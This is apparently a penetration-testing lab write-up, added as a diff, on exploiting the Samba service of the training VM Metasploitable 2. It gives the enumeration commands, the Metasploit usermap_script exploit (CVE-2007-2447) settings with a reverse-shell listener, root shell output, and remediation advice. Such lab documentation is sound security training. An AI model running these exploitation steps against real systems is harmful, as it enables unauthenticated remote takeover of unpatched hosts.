@@ -1,0 +1,131 @@
+# 🛡️ Samba Exploitation – Metasploitable 2
+
+## 📌 Overview
+This section documents the enumeration and exploitation of the vulnerable **Samba service** running on Metasploitable 2. The goal is to identify misconfigurations and vulnerabilities, and ultimately gain system access.
+
+---
+
+## 1️⃣ Service Discovery
+
+### 🔹 Nmap Scan
+
+```bash
+nmap -p139,445 -sV 192.168.56.101
+
+Results:
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+
+✅ Samba detected
+✅ Outdated version
+✅ High chance of known vulnerabilities
+2️⃣ Share Enumeration
+🔹 Listing Shares
+
+smbclient -L 192.168.56.101 -N
+
+Results:
+
+Anonymous login successful
+
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+tmp             Disk      oh noes!
+opt             Disk
+IPC$            IPC       IPC Service
+ADMIN$          IPC       IPC Service
+
+✅ Anonymous access allowed
+✅ Writable “tmp” share indicates misconfiguration
+3️⃣ Advanced Enumeration
+🔹 Enum4Linux
+
+enum4linux -a 192.168.56.101
+
+Key Findings:
+
+    Multiple system users exposed (e.g. root, www-data, ftp, msfadmin)
+
+    Workgroup: WORKGROUP
+
+    Shared resources accessible without credentials
+
+⚠️ Critical misconfiguration: Anonymous access + exposed user information
+4️⃣ Vulnerability Identification
+
+The Samba version on Metasploitable 2 is known to be vulnerable to:
+✅ CVE-2007-2447 – usermap_script RCE
+
+This vulnerability allows remote command execution without authentication, leading to full system compromise.
+5️⃣ Exploitation (Metasploit)
+🔹 Launching Metasploit
+
+msfconsole
+
+🔹 Loading the Exploit
+
+use exploit/multi/samba/usermap_script
+
+🔹 Setting Targets
+
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.104
+
+🔹 Running the Exploit
+
+run
+
+6️⃣ Successful Compromise
+
+Session Output:
+
+[*] Started reverse TCP handler on 192.168.56.104:4444 
+[*] Command shell session 1 opened (192.168.56.104:4444 -> 192.168.56.101:38649)
+
+whoami
+root
+
+id
+uid=0(root) gid=0(root)
+
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+hostname
+metasploitable
+
+pwd
+/
+
+✅ Full root access
+✅ No credentials required
+✅ Remote Code Execution achieved
+7️⃣ Impact Analysis
+Factor	Result
+Authentication Required	❌ No
+Privilege Level	✅ Root
+Attack Complexity	✅ Low
+Impact	🔥 Full System Compromise
+
+Conclusion:
+The vulnerable Samba service allows an unauthenticated attacker to take full control of the system, demonstrating a critical security failure.
+8️⃣ Remediation
+
+    Upgrade Samba to latest patched version
+
+    Disable usermap_script
+
+    Remove anonymous access
+
+    Restrict shared resources
+
+    Enforce authentication and least-privilege policies
+
+    Perform regular patching and service audits
+
+✅ Summary
+
+The Samba service on Metasploitable 2 is critically vulnerable. Using CVE‑2007‑2447, we successfully obtained a remote root shell without authentication, demonstrating the severe risk of outdated and misconfigured network services.
